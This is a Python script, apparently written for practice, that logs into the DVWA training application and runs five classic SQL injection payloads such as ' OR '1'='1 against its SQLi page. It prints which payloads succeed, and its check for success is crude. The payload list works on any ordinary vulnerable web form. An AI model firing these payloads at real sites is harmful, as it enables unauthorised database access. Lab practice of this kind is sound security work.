
import requests

from dvwa.globals import DVWA_URL
from dvwa.utils import login_session


def main():
    url = f"{DVWA_URL}/vulnerabilities/sqli/"
    session = requests.Session()
    session.cookies.set("security", "low")
    session = login_session(session)
 #    cookie = {
 #        "PHPSESSID": "YOUR_SESSION_ID",
 #        "security": "low",
 #    }  # Replace with your DVWA session cookie
    # Common SQL injection payloads
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR 1=1#",
        "' OR 1=1-- ",
        "1' OR '1'='1",
    ]

    # Loop through payloads and send requests
    for payload in payloads:
        params = {"id": payload, "Submit": "Submit"}
        response = requests.get(url, params=params, cookies=session.cookies.get_dict())

        if "Welcome" in response.text or "ID" in response.text:
            print(f"[+] Successful payload: {payload}")
        else:
            print(f"[-] Payload failed: {payload}")


if __name__ == "__main__":
    import logging
    logging.basicConfig(level=logging.DEBUG)
    main()
